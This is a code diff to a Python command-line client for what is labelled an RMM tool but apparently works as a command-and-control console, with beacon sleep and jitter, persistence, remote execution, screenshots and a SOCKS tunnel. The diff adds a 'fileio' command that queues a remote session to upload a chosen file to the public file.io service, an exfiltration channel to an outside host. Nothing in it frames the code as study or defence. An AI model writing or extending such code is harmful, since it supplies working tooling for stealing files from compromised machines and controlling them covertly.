@@ -55,6 +55,7 @@ RMM_CLI_COMMANDS = [
     "set_jitter",
     "show_config",
     "download",
+    "fileio",
     "upload",
     "screenshot",
     "socks",
@@ -186,6 +187,16 @@ class RmmApiClient:
             "POST",
             f"/api/v1/sessions/{session_id}/download",
             {"remote_path": remote_path},
+        )
+
+    def queue_fileio(self, session_id: str, remote_path: str, expires: str | None = None):
+        body = {"remote_path": remote_path}
+        if expires:
+            body["expires"] = expires
+        return self.request(
+            "POST",
+            f"/api/v1/sessions/{session_id}/fileio",
+            body,
         )
 
     def queue_screenshot(self, session_id: str):
@@ -555,6 +566,14 @@ def cmd_download(client: RmmApiClient, state: dict, args):
     print("Download queued — check server RMM_logs/downloads/ or poll events")
 
 
+def cmd_fileio(client: RmmApiClient, state: dict, args):
+    sid = require_session(state, args.session)
+    code, data = client.queue_fileio(sid, args.remote_path, expires=args.expires)
+    if code != 200:
+        die(f"file.io queue failed ({code}): {data}")
+    print("file.io upload queued — poll events for https://file.io/… link")
+
+
 def cmd_upload(client: RmmApiClient, state: dict, args):
     sid = require_session(state, args.session)
     if not os.path.isfile(args.local):
@@ -653,7 +672,7 @@ def _show_help():
 Session:  list | use <id> | info | background | kill [id]
 Beacon:   set_sleep <seconds> | set_jitter <percent> | show_config
 Remote:   <command>  (queue) | exec <command>  (wait) | persist <cmd> | stop
-Files:    download <remote> | upload <local> <remote> | screenshot
+Files:    download <remote> | fileio <remote> [expires] | upload <local> <remote> | screenshot
 Tunnel:   socks list | socks [port] | socks stop   (SOCKS5 on 127.0.0.1, default 1080)
 Other:    events [since] | health | help | quit
 
@@ -1034,6 +1053,26 @@ def run_interactive(
                 else:
                     warn(f"failed ({code})")
                 continue
+            if cmd == "fileio":
+                if not rest:
+                    warn("Usage: fileio <remote_path> [expires]")
+                    continue
+                sid = session_or_none(state)
+                if not sid:
+                    warn("No session selected")
+                    continue
+                expires = None
+                if len(rest) >= 2:
+                    expires = rest[-1]
+                    remote = " ".join(rest[:-1])
+                else:
+                    remote = " ".join(rest)
+                code, _ = client.queue_fileio(sid, remote, expires=expires)
+                if code == 200:
+                    say("file.io upload queued")
+                else:
+                    warn(f"failed ({code})")
+                continue
             if cmd == "upload":
                 if len(rest) < 2:
                     warn("Usage: upload <local_file> <remote_path>")
@@ -1300,6 +1339,12 @@ def build_parser() -> argparse.ArgumentParser:
     sp_dl.add_argument("remote_path")
     sp_dl.add_argument("--session", "-s", default=None)
     sp_dl.set_defaults(func=cmd_download)
+
+    sp_fio = sub.add_parser("fileio", help="Queue remote file upload to file.io")
+    sp_fio.add_argument("remote_path")
+    sp_fio.add_argument("--expires", default=None, help="file.io expiry (e.g. 14d, 1w, 1m)")
+    sp_fio.add_argument("--session", "-s", default=None)
+    sp_fio.set_defaults(func=cmd_fileio)
 
     sp_ul = sub.add_parser("upload", help="Upload local file to remote path")
     sp_ul.add_argument("local")
